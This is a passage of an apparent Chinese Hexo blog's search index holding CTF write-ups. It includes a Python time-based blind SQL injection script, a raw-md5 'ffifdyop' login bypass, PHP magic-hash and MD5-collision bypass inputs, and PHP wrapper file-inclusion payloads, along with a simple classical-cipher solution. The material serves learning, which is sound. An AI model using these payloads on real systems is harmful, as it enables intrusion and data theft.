i += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    #数据库名为greatsql</span><br><span class="line">    def db_name():</span><br><span class="line">        name = &quot;&quot;</span><br><span class="line">        for i in range(1,8):</span><br><span class="line">            for j in alpha:</span><br><span class="line">                payload = &quot;g01den&#x27;/**/Or/**/if(substr(database(),&#123;&#125;,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;.format(i,j)</span><br><span class="line">                data = &#123;&quot;name&quot;: payload&#125;</span><br><span class="line">                time.sleep(0.3)</span><br><span class="line">                if istime(data) == &quot;timeout&quot;:</span><br><span class="line">                    name += j</span><br><span class="line">                    break</span><br><span class="line">       print(&quot;数据库的名字是&quot;+name)</span><br><span class="line">    return name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 数据库的个数为4</span><br><span class="line">def db_name_count():</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;g01den&#x27;/**/Or/**/if((seLect/**/COUNT(database_name)/**/fRom/**/mysql.innodb_table_stats)/**/like/**/&#123;&#125;,sLeep(20),sLeep(0))#&quot;.format(i)</span><br><span class="line">        data = &#123;&quot;name&quot;: payload&#125;</span><br><span class="line">        # print(payload)</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        if istime(data) == &quot;timeout&quot;:</span><br><span class="line">            print(&quot;数据库的个数为&quot;+str(i))</span><br><span class="line">            return i</span><br><span class="line">        i += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # [10, 5, 5, 7]</span><br><span class="line">    def db_name_len_list():</span><br><span class="line">        name_len_list = []</span><br><span class="line">        for i in range(0,4):</span><br><span class="line">            for j in range(0,100):</span><br><span class="line">                payload = &quot;g01den&#x27;/**/Or/**/if((select/**/length(database_name)/**/from/**/mysql.innodb_table_stats/**/limit/**/&#123;&#125;,1)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;.format(i,j)</span><br><span class="line">                data = &#123;&quot;name&quot;: payload&#125;</span><br><span class="line">                # print(payload)</span><br><span class="line">                time.sleep(0.3)</span><br><span class="line">                if istime(data) == &quot;timeout&quot;:</span><br><span class="line">                    name_len_list.append(j)</span><br><span class="line">                    break</span><br><span class="line">        print(name_len_list)</span><br><span class="line">        return name_len_list</span><br><span class="line">    </span><br><span class="line">    # 上一个查询结果为四次，所以手动查四次，没跑完一次，修改limit后面的参数，以及第一层for循环的参数</span><br><span class="line">    # flag1shere</span><br><span class="line">    # mysql</span><br><span class="line">    # users</span><br><span class="line">    # workers</span><br><span class="line">    def db_name_list():</span><br><span class="line">        name = &quot;&quot;</span><br><span class="line">        for i in range(1,8):</span><br><span class="line">            for j in alpha:</span><br><span class="line">                payload = &quot;g01den&#x27;/**/Or/**/if((select/**/substr(database_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/limit/**/3,1)/**/like/**/&#x27;&#123;&#125;&#x27;,sLeep(20),sLeep(0))#&quot;.format(i,j)</span><br><span class="line">                data = &#123;&quot;name&quot;: payload&#125;</span><br><span class="line">                # print(payload)</span><br><span class="line">                time.sleep(0.3)</span><br><span class="line">                if istime(data) == &quot;timeout&quot;:</span><br><span class="line">                    name += j</span><br><span class="line">                    time.sleep(2)</span><br><span class="line">                    break</span><br><span class="line">        print(name)</span><br><span class="line">        return name</span><br><span class="line">    </span><br><span class="line">    # 当前数据库的表有2</span><br><span class="line">    def tb_count():</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;g01den&#x27;/**/Or/**/if((select/**/count(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;.format(i)</span><br><span class="line">        data = &#123;&quot;name&quot;: payload&#125;</span><br><span class="line">        # print(payload)</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        if istime(data) == &quot;timeout&quot;:</span><br><span class="line">            print(&quot;当前数据库的表有&quot;+str(i))</span><br><span class="line">            return i</span><br><span class="line">        i += 1</span><br><span class="line">    </span><br><span class="line">    # 因为测出来有两个表，所以需要查两次</span><br><span class="line">    # 当前数据库表名长度为36</span><br><span class="line">    # 当前数据库表名长度为8</span><br><span class="line">    def tb_name_len():</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;g01den&#x27;/**/Or/**/if((select/**/length(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/like/**/&#123;&#125;,sleep(20),sLeep(0))#&quot;.format(i)</span><br><span class="line">        data = &#123;&quot;name&quot;: payload&#125;</span><br><span class="line">        # print(payload)</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">        if istime(data) == &quot;timeout&quot;:</span><br><span class="line">            print(&quot;当前数据库表名长度为&quot; + str(i))</span><br><span class="line">            return i</span><br><span class="line">        i += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 因为存在两张表，所以得查两次</span><br><span class="line">    # flag_is_in_flag1shere_loockhere_flag</span><br><span class="line">    # flag</span><br><span class="line">    def tb_name():</span><br><span class="line">    name = &quot;&quot;</span><br><span class="line">    for i in range(1,37):</span><br><span class="line">        for j in alpha:</span><br><span class="line">            payload = &quot;g01den&#x27;/**/Or/**/if((select/**/substr(table_name,&#123;&#125;,1)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/like/**/&#x27;flag1shere&#x27;/**/limit/**/0,1)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;.format(i,j)</span><br><span class="line">            data = &#123;&quot;name&quot;: payload&#125;</span><br><span class="line">            # print(payload)</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">            if istime(data) == &quot;timeout&quot;:</span><br><span class="line">                print(j,end=&quot;&quot;)</span><br><span class="line">                name += j</span><br><span class="line">                break</span><br><span class="line">    print(name)</span><br><span class="line">    return name</span><br><span class="line">    </span><br><span class="line">    # 数据库的数据个数为1</span><br><span class="line">    def flag_count():</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;g01den&#x27;/**/or/**/if((select/**/count(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;.format(i)</span><br><span class="line">        data = &#123;&quot;name&quot;: payload&#125;</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        if istime(data) == &quot;timeout&quot;:</span><br><span class="line">            print(&quot;数据库的数据个数为&quot;+str(i))</span><br><span class="line">            return i</span><br><span class="line">        i += 1</span><br><span class="line">    </span><br><span class="line">    # flag的长度为32</span><br><span class="line">    def flag_name_len():</span><br><span class="line">    i = 0</span><br><span class="line">    while True:</span><br><span class="line">        payload = &quot;g01den&#x27;/**/or/**/if((select/**/length(flag)/**/from/**/flag1shere.lookhere)/**/like/**/&#123;&#125;,sleep(20),sleep(0))#&quot;.format(i)</span><br><span class="line">        data = &#123;&quot;name&quot;: payload&#125;</span><br><span class="line">        time.sleep(0.3)</span><br><span class="line">        if istime(data) == &quot;timeout&quot;:</span><br><span class="line">            print(&quot;flag的长度为&quot; + str(i))</span><br><span class="line">            return i</span><br><span class="line">        i += 1</span><br><span class="line">    </span><br><span class="line">    # hectf&#123;fl4g_1s_h5r5_n1ce_try_4_u&#125;</span><br><span class="line">    def flag_get():</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for i in range(1,34):</span><br><span class="line">        for j in alpha:</span><br><span class="line">            payload = &quot;g01den&#x27;/**/or/**/if((select/**/substr(flag,&#123;&#125;,1)/**/from/**/flag1shere.lookhere)/**/in/**/(&#x27;&#123;&#125;&#x27;),sleep(20),sleep(0))#&quot;.format(i,j)</span><br><span class="line">            data = &#123;&quot;name&quot;: payload&#125;</span><br><span class="line">            print(payload)</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">            if istime(data) == &quot;timeout&quot;:</span><br><span class="line">                flag += j</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line">    print(flag)</span><br><span class="line">    return flag</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="HECTF2024-迷茫的艾米莉"><a href="#HECTF2024-迷茫的艾米莉" class="headerlink" title="[HECTF2024]迷茫的艾米莉"></a>[HECTF2024]迷茫的艾米莉</h2><p style="font-size:10px;color:#7f8c93">题目来源：HECTF<br>题目类型：Crypto<br>设计考点：栅栏密码，维吉尼亚密码</p><p>题目描述：迷茫的艾米莉 描述：在维吉尼亚小镇，园丁艾米莉的responsibility是照顾一座古老花园，每天修剪六段绿篱栅栏。一天，她 发现通往秘密花园的小径，入口却被封上了，上面有一串密文Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr，请输入密码帮助艾米莉探索秘密花园</p><p>根据提示这是一串栅栏密码，W型KEY为6，解密得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">YIUIT&#123;P0fo2bb51lbbmew_0f_rczav9_jv&#125;</span><br></pre></td></tr></table></figure><p>显然还不是flag，那么就要继续尝试<br>发现题干有responsibility一串字样，猜测可能为某个KEY，最会发现是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key: responsibility</span><br><span class="line"></span><br><span class="line">HECTF&#123;C0ng2at51ations_0n_comin9_in&#125;</span><br><span class="line"></span><br><span class="line">维吉尼亚密码</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题日记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF 2020_easy_md5题解</title>
      <link href="/2024/07/28/%5BBJDCTF%202020%5Deasy_md5/"/>
      <url>/2024/07/28/%5BBJDCTF%202020%5Deasy_md5/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF-2020-easy-md5题解"><a href="#BJDCTF-2020-easy-md5题解" class="headerlink" title="[BJDCTF 2020]easy_md5题解"></a><center>[BJDCTF 2020]easy_md5题解</h1><p><img src="/../img/md5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-28%20170034.png"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点:"></a>知识点:</h2><ol><li><em><strong>md5(password,true)</strong></em><br><img src="/../img/md5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-28%20165040.png" alt="图片alt" title="md5用法"></li><li><em><strong>php弱类型匹配或数组绕过</strong></em><br><img src="/../img/md5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-28%20165405.png"></li></ol><p>在响应头得到提示属于SQL注入与md5结合的题目</p><p><code>select * from &#39;admin&#39; where password=md5($pass,true)</code><br>$pass$就是我们上传的$password$，当<code>password=md5($pass,true)</code><br>为真时，前面的<code>select * from &#39;admin&#39;</code>才会进行查询,这里需要用将<code>md5($pass,true)</code>将它转化为<code>&#39;or 1</code></p><p>这里用到一个特殊的字符串$ffifdyop$,</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line"></span><br><span class="line">raw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line"></span><br><span class="line">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure><p>$ffifdyop$ 这个字符串被 $md5$ 哈希了之后会变成 $276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 $’ or ‘6$而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 <code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p><p>$’6xxxx’$在布尔比较中当成真<br>在框中输入$ffifdyop$后跳转到下一个页面<br><img src="/../img/md5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-28%20171038.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    header(&#x27;Location: levell14.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>从源代码的注释中可以得知这是一个弱类型比较可以使用数组绕过</p><p>下一组也是使用数组绕过</p><ol><li><p>常规的0e绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"></span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure><p>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</p></li><li><p>数组绕过</p></li></ol><p>如下代码<br><code>var_dump(md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;]))</code></p><p>传入</p><p><code>a[]=a&amp;b[]=b </code></p><p>可以看到，MD5一个数组返回了null，null&#x3D;&#x3D;null，成功绕过</p><ol start="3"><li><p>强类型绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">$Param1=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">$Param2=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line"></span><br><span class="line">$data1=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x07\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\xf1\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\x72\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\x34\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\x28\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\xab\x6f\xf7\x2a\x70&quot;;</span><br><span class="line">$data2=&quot;\xd1\x31\xdd\x02\xc5\xe6\xee\xc4\x69\x3d\x9a\x06\x98\xaf\xf9\x5c\x2f\xca\xb5\x87\x12\x46\x7e\xab\x40\x04\x58\x3e\xb8\xfb\x7f\x89\x55\xad\x34\x06\x09\xf4\xb3\x02\x83\xe4\x88\x83\x25\x71\x41\x5a\x08\x51\x25\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2\x80\x37\x3c\x5b\xd8\x82\x3e\x31\x56\x34\x8f\x5b\xae\x6d\xac\xd4\x36\xc9\x19\xc6\xdd\x53\xe2\xb4\x87\xda\x03\xfd\x02\x39\x63\x06\xd2\x48\xcd\xa0\xe9\x9f\x33\x42\x0f\x57\x7e\xe8\xce\x54\xb6\x70\x80\xa8\x0d\x1e\xc6\x98\x21\xbc\xb6\xa8\x83\x93\x96\xf9\x65\x2b\x6f\xf7\x2a\x70&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进行url解码后的MD5值相等</p></li><li><p>$a&#x3D;&#x3D;md5($a)</p></li></ol><p>0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等</p>]]></content>
      
      
      <categories>
          
          <category> 刷题日记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sql</title>
      <link href="/2024/07/22/Sql/"/>
      <url>/2024/07/22/Sql/</url>
      
        <content type="html"><![CDATA[<h2 id="Sql注入基本步骤"><a href="#Sql注入基本步骤" class="headerlink" title="Sql注入基本步骤"></a><font color = '008000'>Sql注入基本步骤</font></h2><ol><li>查找注入点</li><li>判断是字符型还是数字型注入 and 1&#x3D;1 and 1&#x3D;2 &#x2F; 3-1</li><li>如果是字符型判断他的闭合方式, ‘ “ ‘) “)</li><li>判断数据列数 group by &#x2F; order by</li><li>寻找回显位置</li></ol><hr><h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a><font color = '008000'>相关命令</font></h2><ol><li><code>database()</code></li><li><code>group_concat()</code></li><li><code>concat()</code></li><li><code>substring(),00,30</code></li></ol><hr><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><font color = '008000'>报错注入</font></h2>   <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue(XML_document,XPath_string)</span><br><span class="line"></span><br><span class="line">updatexml(XML_document,XPath_string,new_value)</span><br></pre></td></tr></table></figure><h3 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a><font color = '808044'>floor报错</font></h3><table><thead><tr><th>涉及函数</th><th>作用</th></tr></thead><tbody><tr><td>rand()</td><td>随机生成0~1之间的小数</td></tr><tr><td>floor()</td><td>小数向下取整数。向上取整数ceiling()</td></tr><tr><td>concat_ws()</td><td>将括号内数据用第一个字段连接起来</td></tr><tr><td>group_by</td><td>分组语句，常用于，结合统计函数，根据一个或多个列对结果集进行分组</td></tr><tr><td>as</td><td>别名</td></tr><tr><td>count()</td><td>汇总统计数量</td></tr><tr><td>limit</td><td>这里用于显示指定行数</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2024/06/09/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2024/06/09/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">协议</th><th align="center">测试PHP版本</th><th align="center">allow_url_fopen</th><th align="center">allow_url_include</th><th align="center">用法</th></tr></thead><tbody><tr><td align="center"><a href="#file">file:&#x2F;&#x2F;</a></td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">?file&#x3D;file:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;phpcode.txt</td></tr><tr><td align="center">php:&#x2F;&#x2F;filter</td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php<or>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-7.UCS-4*&#x2F;resource</td></tr><tr><td align="center"><a href="#Input">php:&#x2F;&#x2F;input</a></td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">on</td><td align="center">?fle&#x3D;php:&#x2F;&#x2F;input 【POST DATA】<?php phpinfo()?></td></tr><tr><td align="center">zip:&#x2F;&#x2F;</td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.zip%23phpcode.txt</td></tr><tr><td align="center">compress.bzip2:&#x2F;&#x2F;</td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">?hle&#x3D;compress.bzip2:&#x2F;&#x2F;D&#x2F;softphpStudy&#x2F;VW&#x2F;hle.bz2</br>【or】</br>?file&#x3D;compress.bzip2:&#x2F;&#x2F;&#x2F;file.bz2</td></tr><tr><td align="center">compress.zlib:&#x2F;&#x2F;</td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">?file&#x3D;compress.zlib:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WW&#x2F;file.gz【or】?file&#x3D;compress.zlib:&#x2F;&#x2F;.&#x2F;file.gz</td></tr><tr><td align="center">data:&#x2F;&#x2F;</td><td align="center">&gt;&#x3D;5.2</td><td align="center">on</td><td align="center">on</td><td align="center">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo0?></br>【or】</br>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaWSmbygpPz4&#x3D;</br>也可以:?file&#x3D;data:text&#x2F;plain,<?php phpinfo0?></br>【or】</br>?file&#x3D;datatext&#x2F;plain:base64.PD9waHAgcGhwaW5mbyqpPz4&#x3D;</td></tr></tbody></table><hr><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p><em>file</em>为待传的变量名</br><br>变量名&#x3D;php:&#x2F;&#x2F;input然后post想运行的语句</br><br>场景:文件包含</br><br>建议使用burpsuite</br></p><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>用于访问服务端本地的文件</br><br>用法：变量&#x3D;file:&#x2F;&#x2F;文件地址</br><br>场景:文件包含</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇文章</title>
      <link href="/2024/06/09/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
      <url>/2024/06/09/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/06/09/hello-world/"/>
      <url>/2024/06/09/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
